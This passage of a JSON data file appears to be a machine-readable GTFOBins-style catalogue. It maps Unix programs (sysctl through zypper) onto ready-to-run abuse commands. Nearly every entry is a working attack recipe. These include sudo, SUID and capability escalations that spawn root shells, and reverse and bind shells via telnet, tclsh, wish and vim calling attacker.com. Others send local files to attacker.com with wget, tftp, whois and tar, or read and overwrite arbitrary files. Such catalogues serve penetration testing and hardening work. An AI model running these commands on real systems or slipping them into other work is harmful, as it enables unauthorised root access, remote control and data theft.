      "sudo sh -c 'cp $(which sysctl) .; chmod +s ./sysctl'\n\nLFILE=file_to_read\n./sysctl -n \"/../../$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo sysctl -n \"/../../$LFILE\""
    ]
  },
  "systemctl": {
    "SUID": [
      "sudo sh -c 'cp $(which systemctl) .; chmod +s ./systemctl'\n\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF"
    ],
    "Sudo": [
      "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice",
      "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF",
      "sudo systemctl\n!sh"
    ]
  },
  "tac": {
    "File read": [
      "LFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which tac) .; chmod +s ./tac'\n\nLFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\""
    ]
  },
  "tail": {
    "File read": [
      "LFILE=file_to_read\ntail -c1G \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which tail) .; chmod +s ./tail'\n\nLFILE=file_to_read\n./tail -c1G \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\""
    ]
  },
  "tar": {
    "Shell": [
      "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
      "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'",
      "TF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*"
    ],
    "File upload": [
      "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_send.tar\nLFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh"
    ],
    "File download": [
      "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_get.tar\ntar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh"
    ],
    "File write": [
      "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P"
    ],
    "File read": [
      "LFILE=file_to_read\ntar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'"
    ],
    "Sudo": [
      "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which tar) .; chmod +s ./tar'\n\n./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    ]
  },
  "taskset": {
    "Shell": [
      "taskset 1 /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which taskset) .; chmod +s ./taskset'\n\n./taskset 1 /bin/sh -p"
    ],
    "Sudo": [
      "sudo taskset 1 /bin/sh"
    ]
  },
  "tclsh": {
    "Shell": [
      "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"
    ],
    "Non-interactive reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which tclsh) .; chmod +s ./tclsh'\n\n./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr"
    ],
    "Sudo": [
      "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"
    ]
  },
  "tcpdump": {
    "Command": [
      "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF"
    ],
    "Sudo": [
      "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"
    ]
  },
  "tee": {
    "File write": [
      "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which tee) .; chmod +s ./tee'\n\nLFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\""
    ]
  },
  "telnet": {
    "Shell": [
      "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh"
    ],
    "Reverse shell": [
      "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF"
    ],
    "Sudo": [
      "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which telnet) .; chmod +s ./telnet'\n\nRHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh"
    ]
  },
  "tftp": {
    "File upload": [
      "RHOST=attacker.com\ntftp $RHOST\nput file_to_send"
    ],
    "File download": [
      "RHOST=attacker.com\ntftp $RHOST\nget file_to_get"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which tftp) .; chmod +s ./tftp'\n\nRHOST=attacker.com\n./tftp $RHOST\nput file_to_send"
    ],
    "Sudo": [
      "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send"
    ]
  },
  "time": {
    "Shell": [
      "/usr/bin/time /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which time) .; chmod +s ./time'\n\n./time /bin/sh -p"
    ],
    "Sudo": [
      "sudo /usr/bin/time /bin/sh"
    ]
  },
  "timeout": {
    "Shell": [
      "timeout 7d /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which timeout) .; chmod +s ./timeout'\n\n./timeout 7d /bin/sh -p"
    ],
    "Sudo": [
      "sudo timeout --foreground 7d /bin/sh"
    ]
  },
  "tmux": {
    "Shell": [
      "tmux"
    ],
    "Sudo": [
      "sudo tmux"
    ]
  },
  "top": {
    "Shell": [
      "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset"
    ],
    "Sudo": [
      "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset"
    ]
  },
  "ul": {
    "File read": [
      "LFILE=file_to_read\nul \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which ul) .; chmod +s ./ul'\n\nLFILE=file_to_read\n./ul \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo ul \"$LFILE\""
    ]
  },
  "unexpand": {
    "File read": [
      "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which unexpand) .; chmod +s ./unexpand'\n\nLFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\""
    ]
  },
  "uniq": {
    "File read": [
      "LFILE=file_to_read\nuniq \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which uniq) .; chmod +s ./uniq'\n\nLFILE=file_to_read\n./uniq \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo uniq \"$LFILE\""
    ]
  },
  "unshare": {
    "Shell": [
      "unshare /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which unshare) .; chmod +s ./unshare'\n\n./unshare -r /bin/sh"
    ],
    "Sudo": [
      "sudo unshare /bin/sh"
    ]
  },
  "uudecode": {
    "File read": [
      "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which uudecode) .; chmod +s ./uudecode'\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode"
    ]
  },
  "uuencode": {
    "File read": [
      "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which uuencode) .; chmod +s ./uuencode'\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode"
    ]
  },
  "valgrind": {
    "Shell": [
      "valgrind /bin/sh"
    ],
    "Sudo": [
      "sudo valgrind /bin/sh"
    ]
  },
  "vi": {
    "Shell": [
      "vi -c ':!/bin/sh' /dev/null",
      "vi\n:set shell=/bin/sh\n:shell"
    ],
    "File write": [
      "vi file_to_write\niDATA\n^[\nw"
    ],
    "File read": [
      "vi file_to_read"
    ],
    "Sudo": [
      "sudo vi -c ':!/bin/sh' /dev/null"
    ]
  },
  "vim": {
    "Shell": [
      "vim -c ':!/bin/sh'",
      "vim\n:set shell=/bin/sh\n:shell",
      "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
      "vim -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
    ],
    "Non-interactive reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
    ],
    "Non-interactive bind shell": [
      "export LPORT=12345\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
    ],
    "File upload": [
      "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'",
      "export LPORT=8888\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'",
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'",
      "export LPORT=12345\nexport LFILE=file_to_save\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
    ],
    "File write": [
      "vim file_to_write\niDATA\n^[\nw"
    ],
    "File read": [
      "vim file_to_read"
    ],
    "Library load": [
      "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which vim) .; chmod +s ./vim'\n\n./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "Sudo": [
      "sudo vim -c ':!/bin/sh'",
      "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
      "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "Capabilities": [
      "cp $(which vim) .\nsudo setcap cap_setuid+ep vim\n\n./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which vim) .; chmod +s ./vim'\n\n./vim -c ':lua os.execute(\"reset; exec sh\")'"
    ]
  },
  "watch": {
    "Shell": [
      "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which watch) .; chmod +s ./watch'\n\n./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    ],
    "Sudo": [
      "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which watch) .; chmod +s ./watch'\n\n./watch 'reset; exec sh 1>&0 2>&0'"
    ]
  },
  "wget": {
    "File upload": [
      "URL=http://attacker.com/\nLFILE=file_to_send\nwget --post-file=$LFILE $URL"
    ],
    "File download": [
      "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which wget) .; chmod +s ./wget'\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./wget $URL -O $LFILE"
    ],
    "Sudo": [
      "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo wget $URL -O $LFILE"
    ]
  },
  "whois": {
    "File upload": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`cat $LFILE`\"",
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`base64 $LFILE`\""
    ],
    "File download": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"",
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\""
    ]
  },
  "wish": {
    "Shell": [
      "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr"
    ],
    "Non-interactive reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish"
    ],
    "Sudo": [
      "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr"
    ]
  },
  "xargs": {
    "Shell": [
      "xargs -a /dev/null sh",
      "echo x | xargs -Iy sh -c 'exec sh 0<&1'",
      "xargs -Ix sh -c 'exec sh 0<&1'\nx^D^D"
    ],
    "File read": [
      "LFILE=file_to_read\nxargs -a \"$LFILE\" -0"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which xargs) .; chmod +s ./xargs'\n\n./xargs -a /dev/null sh -p"
    ],
    "Sudo": [
      "sudo xargs -a /dev/null sh"
    ]
  },
  "xxd": {
    "File write": [
      "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\""
    ],
    "File read": [
      "LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which xxd) .; chmod +s ./xxd'\n\nLFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r"
    ]
  },
  "xz": {
    "File read": [
      "LFILE=file_to_read\nxz -c \"$LFILE\" | xz -d"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which xz) .; chmod +s ./xz'\n\nLFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d"
    ]
  },
  "yelp": {
    "File read": [
      "LFILE=file_to_read\nyelp \"man:$LFILE\""
    ]
  },
  "yum": {
    "Sudo": [
      "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n",
      "sudo yum localinstall -y x-1.0-1.noarch.rpm",
      "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y"
    ]
  },
  "zip": {
    "Shell": [
      "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF"
    ],
    "Sudo": [
      "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which zip) .; chmod +s ./zip'\n\nTF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"
    ]
  },
  "zsh": {
    "Shell": [
      "zsh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which zsh) .; chmod +s ./zsh'\n\n./zsh"
    ],
    "Sudo": [
      "sudo zsh"
    ]
  },
  "zsoelim": {
    "File read": [
      "LFILE=file_to_read\nzsoelim \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which zsoelim) .; chmod +s ./zsoelim'\n\nLFILE=file_to_read\n./zsoelim \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo zsoelim \"$LFILE\""
    ]
  },
  "zypper": {
    "Shell": [
      "zypper x",
      "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x"
    ],
    "Sudo": [
      "sudo zypper x",
      "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x"
    ]
  }
}